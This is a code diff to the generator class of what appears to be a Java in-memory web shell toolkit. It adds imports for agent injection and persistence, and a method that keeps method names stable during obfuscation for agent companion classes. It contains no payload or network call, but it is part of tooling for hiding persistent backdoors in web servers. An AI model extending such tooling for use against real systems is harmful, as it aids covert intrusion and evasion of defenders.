@@ -2,6 +2,8 @@ package com.reajason.javaweb.memshell;
 
 import com.reajason.javaweb.GenerationException;
 import com.reajason.javaweb.ShellGenerator;
+import com.reajason.javaweb.agent.AgentInjectorSupport;
+import com.reajason.javaweb.agent.AgentPersistence;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ObfuscationConfig;
 import com.reajason.javaweb.memshell.config.ObfuscationScope;
@@ -199,7 +201,7 @@ public class MemShellGenerator {
                 byte[] companionBytes = ClassObfuscation.obfuscate(
                         entry.getValue(), entry.getKey(), shellConfig.getTargetJreVersion(),
                         ObfuscationTarget.INJECTOR, shellConfig.getObfuscation(),
-                        MethodContracts.CONSERVATIVE, companionRelatedClasses, false);
+                        companionContracts(entry.getKey()), companionRelatedClasses, false);
                 obfuscatedInnerClassBytes.put(entry.getKey(), companionBytes);
             }
             innerClassBytes = obfuscatedInnerClassBytes;
@@ -256,6 +258,18 @@ public class MemShellGenerator {
             return null;
         }
         return new ClassReader(helperClassBytes).getClassName().replace('/', '.');
+    }
+
+    /**
+     * Agent 伴随类会被 system classloader 在多次 attach 之间复用，方法名必须跨生成批次稳定；
+     * 其余注入器内部类仍按保守契约单独混淆。
+     */
+    private static Set<MethodSignature> companionContracts(String className) {
+        if (className.startsWith(AgentInjectorSupport.class.getName())
+                || className.startsWith(AgentPersistence.class.getName())) {
+            return MethodContracts.AGENT_COMPANION_CONTRACTS;
+        }
+        return MethodContracts.CONSERVATIVE;
     }
 
     /**
